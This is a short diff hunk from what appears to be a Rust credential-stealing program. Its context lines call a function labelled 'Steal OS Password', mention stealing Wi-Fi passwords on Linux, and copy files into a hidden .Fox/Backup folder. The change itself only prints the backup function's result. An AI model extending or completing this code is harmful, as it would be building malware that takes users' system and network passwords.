@@ -35,8 +35,8 @@ fn main() {
 
     //Steal OS Password
     write!(file_name_os, "{}", steal_os_pas(file_os_password)).expect("Error! Unable to write file.\n");
-
-    take_backup_files(".", ".Fox/Backup");
+    //Backup Time
+    println!("{:?}", take_backup_files(".", ".Fox/Backup"));
 }
 
 //Steal WIFI Password On Linux
